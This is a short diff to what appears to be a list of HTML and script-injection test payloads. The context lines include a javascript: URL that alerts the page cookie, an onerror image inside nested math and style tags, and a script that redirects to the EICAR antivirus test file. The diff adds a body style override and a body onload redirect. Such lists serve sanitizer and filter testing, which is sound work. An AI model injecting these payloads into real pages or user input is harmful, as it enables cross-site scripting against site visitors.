@@ -125,3 +125,5 @@ javascript:alert(document.cookie)
 <math><style> <img src onerror=alert(2)> </style></math>
 <script>window.location.assign('https://secure.eicar.org/eicar_com.zip')</script>
 <body style="background-color:red">
+<body style="background-color:red !important;">
+<body onload=window.location.assign('https://www.google.com')>
